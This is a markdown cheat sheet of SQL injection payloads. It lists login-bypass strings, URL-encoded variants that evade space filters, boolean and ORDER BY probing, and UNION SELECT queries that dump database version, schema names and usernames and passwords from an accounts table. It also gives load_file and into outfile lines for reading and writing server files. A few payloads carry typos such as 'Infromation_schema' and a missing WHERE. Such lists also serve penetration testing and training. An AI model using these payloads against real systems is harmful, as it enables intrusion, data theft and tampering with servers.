### Top SQL Injections:



1- >> ' OR 1=1 #

2- >> " OR 1=1 #

3- >> '  OR 1=1 ' LIMIT 1 #

4- >> "  OR 1=1 ' LIMIT 1 #

5- >> %27%09OR%091%3D1%23 | (ENCODING to bypass the space filter by replacing it with tabs) | use BurpSuite >> `'   OR  1=1#`

6- >> %27%20%2F%2A%2A%2For%2F%2A%2A%2F1%3D1%23 | (ENCODING to bypass spaces and tabs filter) >> `' /**/or/**/1=1#`

&nbsp;
&nbsp;
&nbsp;
---------------------------------------------------------------------------------------------------------------------------------------



### Summary:


__Basic__

>> __' OR 1=1 ;-- - __ 
    
>> __') OR 1=1; -- - __ 
   
>> __' and 'a '='a__

>> __' and 'a'='b__

   
&nbsp;
&nbsp;
&nbsp;

__Medium:__


>>  1' and 1=1 &nbsp;  | nbsp; True 


>>  1' and 1=0 &nbsp;  |  &nbsp; False 


>>  1' order by 1  &nbsp; |  &nbsp; True


>>  1' order by 10000 &nbsp; | &nbsp; False


>>  1 or db_name()=1); &nbsp;|  &nbsp;


>>  1 or db_name(0)=1) &nbsp; | &nbsp; increase the number until the database does not show any errors



>> 9999' UNION SELECT name,222,'else1' FROM master.syslogin; -- 

&nbsp;
&nbsp;
&nbsp;

__Complex:__

>> union select 1, 2, 3 %23                  &nbsp;&nbsp;  |  Bypass Web filters  | 


>> uNioN+sEleCt+1,2+%23                      &nbsp;&nbsp;  |  Bypass Web filters  |  


>> uNioN`/**/`sEleCt`/**/`1,2`/**/`%23       &nbsp;&nbsp;  |  Bypass Web filters  | 
>>

>> UniOn selEct 1,version() /*


>> UniOn selEct 1,database() /*


>> UniOn selEct 1,user() /*


>> UniOn selEct 1,table_name frOm information_schema.tables table_schema = '[database name]' /*


>> UniOn selEct 1,column_name frOm information_schema.columns table_name = '[table name]' /*


>> UniOn selEct 1,[column name] frOm [table name] /*


>> UniOn selEct 1,load_file('file location') /*   Reading files:


>> UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*  Writing files 


>> union select 1, column_name, null, from Infromation_schema .columns where table_name = 0x769166  &nbsp;&nbsp; | hex encoding                                                                                                                                dbname   


>>  ' union select 1, column_name, null, null, null, 5 from Infromation_schema.columns where table_name = 'accounts' | 


>>  ' union select username, pass, is_admin from 'accounts' &nbsp;&nbsp;  | 


>>  ' union select 1, table_name, null, null, null, 5 from Infromation_schema.tables where table_schema = 'owasdb |

